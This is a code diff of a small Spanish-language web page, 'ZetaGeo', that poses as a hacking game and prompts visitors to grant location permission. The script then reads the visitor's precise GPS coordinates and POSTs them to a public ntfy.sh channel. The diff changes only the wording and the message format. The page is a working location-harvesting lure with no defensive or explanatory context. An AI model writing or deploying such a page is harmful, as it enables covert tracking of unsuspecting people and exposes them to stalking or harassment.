@@ -2,56 +2,38 @@
 <html lang="es-Zeta">
 <head>
   <meta charset="UTF-8">
-  <title>ZetaGeo</title>
+  <title>ZetaGeoCrudo</title>
   <style>
-    body {
-      background: #000;
-      color: #0f0;
-      font-family: monospace;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    #msg {
-      font-size: 1.5rem;
-      text-align: center;
-    }
+    body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}
+    #msg{font-size:1.5rem;text-align:center}
   </style>
 </head>
 <body>
-  <div id="msg">Aceptar permiso para empezar a hackear 🚀</div>
+  <div id="msg">Dale a permitir para hackear, cabrón 👽</div>
 
   <script>
-    const ntfyUrl = "https://ntfy.sh/byhertzdelt8999"; // Cambia esto por tu tema privado
+    const ntfyUrl = "https://ntfy.sh/byhertzdelt8999";   // <-- tu canal aquí
 
-    function mandaUbicacion(pos) {
-      const { latitude, longitude, accuracy } = pos.coords;
-      const payload = {
-        lat: latitude,
-        lon: longitude,
-        acc: accuracy,
-        ts: new Date().toISOString()
-      };
+    function mandaTexto(pos) {
+      const lat = pos.coords.latitude.toFixed(6);
+      const lon = pos.coords.longitude.toFixed(6);
+      const acc = pos.coords.accuracy.toFixed(0);
+      const texto = `ZetaGeo: lat=${lat}, lon=${lon}, acc=${acc}m`;
       fetch(ntfyUrl, {
         method: "POST",
-        body: JSON.stringify(payload, null, 2),
-        headers: { "Content-Type": "application/json" }
+        body: texto,
+        headers: {"Content-Type": "text/plain"}
       })
-      .then(() => {
-        document.getElementById("msg").innerText = "Ubicación, jefe 👽";
-      })
-      .catch(err => {
-        document.getElementById("msg").innerText = "Error al enviar: " + err;
-      });
+      .then(() => { document.getElementById("msg").innerText = "Ubicación hackear, jefe 🛰️"; })
+      .catch(e => { document.getElementById("msg").innerText = "Fallo al enviar: " + e; });
     }
 
     function errorHandler(err) {
-      document.getElementById("msg").innerText = "Fallo al obtener ubicación: " + err.message;
+      document.getElementById("msg").innerText = "Permiso denegado o error: " + err.message;
     }
 
     if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(mandaUbicacion, errorHandler, {
+      navigator.geolocation.getCurrentPosition(mandaTexto, errorHandler, {
         enableHighAccuracy: true,
         timeout: 10000,
         maximumAge: 0
